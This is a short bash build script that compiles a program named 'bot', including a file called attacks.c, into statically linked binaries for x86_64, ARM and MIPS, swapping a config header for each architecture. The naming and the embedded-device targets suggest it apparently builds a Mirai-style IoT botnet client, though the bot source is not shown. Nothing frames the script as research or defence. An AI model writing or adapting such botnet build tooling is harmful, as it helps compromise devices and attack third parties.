#!/bin/bash

echo "Rebuilding all bots with proper configs..."

mkdir -p binaries

# x86_64
echo "Building x86_64..."
cp bot/config.h bot/config.h.backup
gcc -o binaries/bot_x86_64 bot/bot.c bot/hmac.c bot/attacks.c -lpthread -ldl -Wall -O2

# ARM
echo "Building ARM..."
cp bot/config_arm.h bot/config.h
arm-linux-gnueabi-gcc -o binaries/bot_arm bot/bot.c bot/hmac.c bot/attacks.c -lpthread -ldl -static -O2

# MIPS
echo "Building MIPS..."
cp bot/config_mips.h bot/config.h
mips-linux-gnu-gcc -o binaries/bot_mips bot/bot.c bot/hmac.c bot/attacks.c -lpthread -ldl -static -O2

# Restore original config
cp bot/config.h.backup bot/config.h

echo ""
echo "✅ Build complete!"
ls -lh binaries/
echo ""
echo "Checking architecture names:"
strings binaries/bot_x86_64 | grep -E "^x86_64$|^arm$|^mips$" || echo "Check manually"
